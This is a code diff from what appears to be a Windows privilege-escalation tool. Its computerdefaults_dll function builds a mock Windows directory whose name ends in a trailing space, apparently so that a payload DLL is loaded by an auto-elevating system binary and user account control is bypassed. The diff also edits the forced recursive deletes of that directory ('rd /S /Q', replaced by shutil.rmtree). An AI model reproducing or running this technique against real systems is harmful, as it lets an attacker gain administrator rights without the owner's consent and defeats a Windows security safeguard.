@@ -20,15 +20,6 @@ computerdefaults_dll_info = {
 
 def computerdefaults_dll(payload):
 	if payloads().dll(payload):
-		if os.path.isfile("\\\?\\{} \\System32\\computerdefaults.exe".format(information().windows_directory())) == True:
-			try:
-				os.system('rd /S /Q "\\\?\\{} "'.format(information().windows_directory()))
-			except Exception as error:
-				print_error("Unable to proceed, unable to clean folder (\\\?\\{} \\System32\\)".format(information().windows_directory()))
-				return False
-			else:
-				pass
-
 		try:
 			os.mkdir("\\\?\\{} ".format(information().windows_directory()))
 		except Exception as error:
@@ -82,7 +73,7 @@ def computerdefaults_dll(payload):
 			time.sleep(5)
 
 		try:
-			os.system('rd /S /Q "\\\?\\{} "'.format(information().windows_directory()))
+			shutil.rmtree("\\\?\\{} ".format(information().windows_directory()))
 		except Exception as error:
 			print_error("Unable to clean, manually cleaning is needed!")
 			return False
